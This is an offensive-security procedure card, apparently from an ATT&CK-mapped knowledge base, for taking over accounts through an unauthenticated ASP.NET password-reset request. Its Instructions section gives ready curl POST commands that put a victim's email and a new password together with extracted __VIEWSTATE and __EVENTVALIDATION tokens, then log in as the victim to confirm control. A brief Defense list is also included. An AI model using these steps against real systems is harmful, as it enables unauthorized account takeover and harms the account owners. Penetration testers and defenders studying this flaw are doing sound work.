---
tags:
  - account-takeover
  - password-reset
  - asp-net
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-send-password-reset]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:33:12.213Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 1b11a5f7-2c9e-4af4-92c1-0fbbbad17534
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Modify-and-Send-Password-Reset-Request

## Summary

This procedure modifies the prepared password change request with victim-specific details and valid state tokens, then submits it to the ASP.NET endpoint to perform an unauthenticated password reset, resulting in account takeover.

## Description

With the request template and extracted tokens, update fields like txtEMail and txtNewPassword, then POST to /Login.aspx. The vulnerability lies in the lack of authentication or ownership checks, allowing the server to process the change directly. Post-exploitation, the attacker can login with the new password to access the account.

## Requirements

1. Prepared request template from prior step
2. Extracted __VIEWSTATE and __EVENTVALIDATION
3. Victim email and desired new password
4. Burp Suite Repeater for safe testing

## Defense

Defensive measures and detection strategies:

- Add session-based authentication middleware for all POST actions
- Verify email ownership via one-time links or OTP before resets
- Audit logs for password changes without prior login sessions
- Block requests with mismatched __VIEWSTATE signatures

## Objectives

1. Inject victim details into the request
2. Submit and confirm password change
3. Validate takeover by logging in with new credentials

## Instructions

### Step 1: Update Request in Burp Repeater

**Context**: Paste the intercepted request into Repeater and modify fields.

**Command** ([[commands/curl-send-password-reset]]):
```bash
curl -X POST https://example.mil/Login.aspx \
  -d "__VIEWSTATE=[EXTRACTED_VIEWSTATE]&__EVENTVALIDATION=[EXTRACTED_EVENTVALIDATION]&txtEMail=victim@example.mil&txtNewPassword=NewPass123&__EVENTTARGET=&__EVENTARGUMENT=&txtMail=victim@example.mil&reqEMailE_ClientState=&revEMailE_ClientState=&btnNewPassword=Submit" \
  -b cookies.txt -v
```

> Replace [EXTRACTED_*] with actual values. Send via Burp or curl. Expected output: 200 OK or redirect indicating success.

### Step 2: Verify Account Takeover

**Context**: Attempt login with new password to confirm control.

**Command** ([[commands/curl-send-password-reset]]):
```bash
curl -X POST https://example.mil/Login.aspx \
  -d "txtUserName=victim@example.mil&txtPassword=NewPass123&btnLogin=Login" \
  -b cookies.txt -v
```

> Expected output: Successful login response (e.g., dashboard redirect).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/curl-send-password-reset]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[account-takeover]]
- [[password-reset]]
